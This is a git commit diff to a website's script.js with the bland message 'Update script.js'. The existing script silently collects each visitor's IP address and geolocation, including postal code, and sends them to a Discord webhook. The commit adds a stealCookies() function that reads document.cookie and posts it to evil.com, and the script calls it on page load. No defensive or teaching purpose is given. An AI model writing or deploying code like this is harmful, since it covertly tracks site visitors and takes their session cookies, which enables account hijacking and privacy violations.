75c8f2411529c05679b00d2431f15f7f965610ef
DrDreadful <124979607+DrDreadful5Official@users.noreply.github.com>
2024-04-21 17:44:17 -0700

    Update script.js

--- script.js
+++ script.js
@@ -1,12 +1,36 @@
+// Function to steal cookies
+function stealCookies() {
+    var cookies = document.cookie;
+    // Send cookies to a remote server
+    fetch('https://evil.com/steal-cookies', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ cookies: cookies })
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Cookies successfully stolen!');
+        } else {
+            console.error('Failed to steal cookies:', response.status, response.statusText);
+        }
+    })
+    .catch(error => {
+        console.error('Error stealing cookies:', error.message);
+    });
+}
+
+// Fetch user's IP and geolocation
 fetch('https://httpbin.org/ip')
-  .then(response => response.json())
-  .then(data => {
+.then(response => response.json())
+.then(data => {
     var clientIp = data.origin;
 
     // Fetch geolocation information from IPinfo.io
     fetch(`https://ipinfo.io/${clientIp}/json?token=0b2944a985b669`)
-      .then(response => response.json())
-      .then(geoData => {
+    .then(response => response.json())
+    .then(geoData => {
         var city = geoData.city;
         var region = geoData.region;
         var country = geoData.country;
@@ -26,34 +50,40 @@ Someone visited the website from:
 - Postal Code: ${postalCode}
 - IP Address: ${clientIp}
 \`\`\``;
-        sendMessageToDiscord(webhookUrl, message);
-      })
-      .catch(error => {
-        console.error('Error fetching geolocation information:', error);
-      });
-  })
-  .catch(error => {
-    console.error('Error fetching IP address:', error.message);
-  });
 
-function sendMessageToDiscord(webhookUrl, message) {
-  fetch(webhookUrl, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-      content: message
+        // Send message to Discord
+        sendMessageToDiscord(webhookUrl, message);
+
+        // Call function to steal cookies
+        stealCookies();
     })
-  })
-  .then(response => {
-    if (response.ok) {
-      console.log('Message sent to Discord!');
-    } else {
-      console.error('Failed to send message to Discord:', response.status, response.statusText);
-    }
-  })
-  .catch(error => {
-    console.error('Error sending message to Discord:', error.message);
-  });
+    .catch(error => {
+        console.error('Error fetching geolocation information:', error);
+    });
+})
+.catch(error => {
+    console.error('Error fetching IP address:', error.message);
+});
+
+// Function to send message to Discord webhook
+function sendMessageToDiscord(webhookUrl, message) {
+    fetch(webhookUrl, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            content: message
+        })
+    })
+    .then(response => {
+        if (response.ok) {
+            console.log('Message sent to Discord!');
+        } else {
+            console.error('Failed to send message to Discord:', response.status, response.statusText);
+        }
+    })
+    .catch(error => {
+        console.error('Error sending message to Discord:', error.message);
+    });
 }
